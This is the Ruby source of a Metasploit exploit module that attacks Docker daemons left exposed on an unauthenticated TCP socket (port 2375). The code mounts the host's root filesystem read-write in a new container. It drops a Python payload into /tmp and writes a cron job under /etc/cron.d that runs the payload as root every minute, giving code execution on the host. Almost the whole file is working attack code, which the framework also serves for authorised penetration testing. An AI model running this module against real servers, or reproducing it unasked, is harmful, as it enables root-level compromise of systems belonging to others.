# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;             => &#039;Docker Daemon - Unprotected TCP Socket Exploit&#039;,
      &#039;Description&#039;      => %q{
        Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp
        with tls but without tls-auth), an attacker can create a Docker
        container with the &#039;/&#039; path mounted with read/write permissions on the
        host server that is running the Docker container. As the Docker
        container executes command as uid 0 it is honored by the host operating
        system allowing the attacker to edit/create files owned by root. This
        exploit abuses this to creates a cron job in the &#039;/etc/cron.d/&#039; path of
        the host server.

        The Docker image should exist on the target system or be a valid image
        from hub.docker.com.
      },
      &#039;Author&#039;           => &#039;Martin Pizala&#039;, # started with dcos_marathon module from Erik Daguerre
      &#039;License&#039;          => MSF_LICENSE,
      &#039;References&#039;       => [
        [&#039;URL&#039;, &#039;https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface&#039;],
        [&#039;URL&#039;, &#039;https://docs.docker.com/engine/reference/commandline/dockerd/#bind-docker-to-another-hostport-or-a-unix-socket&#039;]
      ],
      &#039;DisclosureDate&#039;   => &#039;Jul 25, 2017&#039;,
      &#039;Targets&#039;          => [
        [ &#039;Python&#039;, {
          &#039;Platform&#039;     => &#039;python&#039;,
          &#039;Arch&#039;         => ARCH_PYTHON,
          &#039;Payload&#039;      => {
            &#039;Compat&#039;     => {
              &#039;ConnectionType&#039; => &#039;reverse noconn none tunnel&#039;
            }
          }
        }]
      ],
      &#039;DefaultTarget&#039;    => 0))

    register_options(
      [
        Opt::RPORT(2375),
        OptString.new(&#039;DOCKERIMAGE&#039;, [ true, &#039;hub.docker.com image to use&#039;, &#039;python:3-slim&#039; ]),
        OptString.new(&#039;CONTAINER_ID&#039;, [ false, &#039;container id you would like&#039;])
      ]
    )
  end

  def check_image(image_id)
    vprint_status("Check if images exist on the target host")
    res = send_request_raw(
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => normalize_uri(&#039;images&#039;, &#039;json&#039;)
    )
    return unless res and res.code == 200 and res.body.include? image_id

    res
  end

  def pull_image(image_id)
    print_status("Trying to pulling image from docker registry, this may take a while")
    res = send_request_raw(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => normalize_uri(&#039;images&#039;, &#039;create?fromImage=&#039; + image_id)
    )
    return unless res.code == 200

    res
  end

  def make_container_id
    return datastore[&#039;CONTAINER_ID&#039;] unless datastore[&#039;CONTAINER_ID&#039;].nil?

    rand_text_alpha_lower(8)
  end

  def make_cmd(mnt_path, cron_path, payload_path)
    vprint_status(&#039;Creating the docker container command&#039;)
    echo_cron_path = mnt_path + cron_path
    echo_payload_path = mnt_path + payload_path

    cron_command = "python #{payload_path}"
    payload_data = payload.raw

    command = "echo \"#{payload_data}\" >> #{echo_payload_path} && "
    command << "echo \"PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin\" >> #{echo_cron_path} && "
    command << "echo \"\" >> #{echo_cron_path} && "
    command << "echo \"* * * * * root #{cron_command}\" >> #{echo_cron_path}"

    command
  end

  def make_container(mnt_path, cron_path, payload_path)
    vprint_status(&#039;Setting container json request variables&#039;)
    {
      &#039;Image&#039;       => datastore[&#039;DOCKERIMAGE&#039;],
      &#039;Cmd&#039;         => make_cmd(mnt_path, cron_path, payload_path),
      &#039;Entrypoint&#039;  => %w[/bin/sh -c],
      &#039;HostConfig&#039; => {
        &#039;Binds&#039;    => [
          &#039;/:&#039; + mnt_path
        ]
      }
    }
  end

  def del_container(container_id)
    send_request_raw(
      {
        &#039;method&#039;  => &#039;DELETE&#039;,
        &#039;uri&#039;     => normalize_uri(&#039;containers&#039;, container_id)
      },
      1 # timeout
    )
  end

  def check
    res = send_request_raw(
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(&#039;containers&#039;, &#039;json&#039;),
      &#039;headers&#039;  => { &#039;Accept&#039; => &#039;application/json&#039; }
    )

    if res.nil?
      print_error(&#039;Failed to connect to the target&#039;)
      return Exploit::CheckCode::Unknown
    end

    if res and res.code == 200 and res.headers[&#039;Server&#039;].include? &#039;Docker&#039;
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    # check if target is vulnerable
    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Failure::Unknown, &#039;Failed to connect to the target&#039;)
    end

    # check if image is not available, pull it or fail out
    image_id = datastore[&#039;DOCKERIMAGE&#039;]
    if check_image(image_id).nil?
      fail_with(Failure::Unknown, &#039;Failed to pull the docker image&#039;) if pull_image(image_id).nil?
    end

    # create required information to create json container information.
    cron_path = &#039;/etc/cron.d/&#039; + rand_text_alpha(8)
    payload_path = &#039;/tmp/&#039; + rand_text_alpha(8)
    mnt_path = &#039;/mnt/&#039; + rand_text_alpha(8)
    container_id = make_container_id

    # create container
    res_create = send_request_raw(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => normalize_uri(&#039;containers&#039;, &#039;create?name=&#039; + container_id),
      &#039;headers&#039; => { &#039;Content-Type&#039; => &#039;application/json&#039; },
      &#039;data&#039;    => make_container(mnt_path, cron_path, payload_path).to_json
    )
    fail_with(Failure::Unknown, &#039;Failed to create the docker container&#039;) unless res_create && res_create.code == 201

    print_status("The docker container is created, waiting for deploy")
    register_files_for_cleanup(cron_path, payload_path)

    # start container
    send_request_raw(
      {
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;uri&#039;     => normalize_uri(&#039;containers&#039;, container_id, &#039;start&#039;)
      },
      1 # timeout
    )

    # wait until container stopped
    vprint_status("Waiting until the docker container stopped")
    res_wait = send_request_raw(
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => normalize_uri(&#039;containers&#039;, container_id, &#039;wait&#039;),
      &#039;headers&#039; => { &#039;Accept&#039; => &#039;application/json&#039; }
    )

    # delete container
    deleted_container = false
    if res_wait.code == 200
      vprint_status("The docker container has been stopped, now trying to remove it")
      del_container(container_id)
      deleted_container = true
    end

    # if container does not deploy, remove it and fail out
    unless deleted_container
      del_container(container_id)
      fail_with(Failure::Unknown, "The docker container failed to deploy")
    end
    print_status(&#039;Waiting for the cron job to run, can take up to 60 seconds&#039;)
  end
end

